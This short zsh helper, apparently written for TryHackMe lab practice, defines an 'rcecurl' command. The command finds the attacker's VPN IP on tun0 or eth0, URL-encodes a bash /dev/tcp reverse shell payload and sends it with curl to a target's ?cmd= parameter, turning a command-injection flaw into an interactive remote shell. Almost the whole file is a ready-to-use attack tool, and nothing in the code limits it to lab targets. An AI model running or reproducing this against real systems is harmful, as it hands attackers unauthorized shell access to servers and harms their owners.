# ========================
# reverse shell helper
# ========================

# LHOST for reverse shells (TryHackMe VPN → tun0)
_revshell-lhost() {
  local ip
  ip=$(ip -o -4 addr show tun0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -n "$ip" ]] && { echo "$ip"; return 0 }
  ip=$(ip -o -4 addr show eth0 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
  [[ -n "$ip" ]] && { echo "$ip"; return 0 }
  return 1
}

_rcecurl-trigger() {
  local target="$1"
  local port="${2:-4444}"
  local lhost

  lhost="$(_revshell-lhost)" || {
    echo "[-] LHOST not found (tun0/eth0)" >&2
    return 1
  }

  local cmd="bash -c 'bash -i >& /dev/tcp/${lhost}/${port} 0>&1'"
  local enc
  enc=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$cmd")

  echo "[*] LHOST=$lhost port=$port" >&2
  echo "[*] GET ${target}?cmd=..." >&2
  curl -sS "${target}?cmd=${enc}"
  echo ""
}

rcecurl() {
  if [[ "$1" == "--help" || "$1" == "-h" ]]; then
    echo "usage: rcecurl <target_url> [port]"
    echo "send reverse shell via RCE (tun0 auto IP)"
    echo "default port: 4444"
    return 0
  fi

  local target="$1"
  local port="${2:-4444}"

  if [[ -z "$target" ]]; then
    echo "usage: rcecurl <target_url> [port]"
    return 1
  fi

  _rcecurl-trigger "$target" "$port"
}

_rcecurl() {
  _arguments \
    '1:target url:_urls' \
    '2:port:(4444 5555 6666)'
}

compdef _rcecurl rcecurl
